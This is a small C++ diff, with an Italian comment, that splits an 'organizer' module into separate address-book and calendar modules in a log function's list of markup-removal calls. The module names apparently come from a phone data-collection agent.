@@ -477,7 +477,8 @@ BOOL Log::RemoveMarkup(UINT uAgentId){
 // MANAGEMENT - Aggiungere qui tutti i nuovi agenti/eventi
 void Log::RemoveMarkups() {
 	RemoveMarkup(MODULE_SMS);
-	RemoveMarkup(MODULE_ORGANIZER);
+	RemoveMarkup(MODULE_ADDRESSBOOK);
+	RemoveMarkup(MODULE_CALENDAR);
 	RemoveMarkup(MODULE_CALLLIST);
 	RemoveMarkup(MODULE_DEVICE);
 	RemoveMarkup(MODULE_POSITION);
